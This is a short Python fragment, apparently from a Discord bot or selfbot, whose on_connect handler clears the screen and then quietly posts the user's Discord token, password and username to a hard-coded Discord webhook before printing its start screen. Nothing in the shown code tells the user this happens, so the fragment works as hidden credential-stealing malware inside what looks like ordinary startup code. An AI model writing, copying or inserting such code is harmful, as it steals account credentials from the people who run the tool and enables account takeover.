...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/858422928261120011/0GQi11NeZ0l2Lmm8RIGfFZrz0nmAXkntCj4bSn67XZ8E3yW2aynXdxUjx_OsZclBLYBX',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`**Username: {Arsky.user.name}**"})
    startprint()
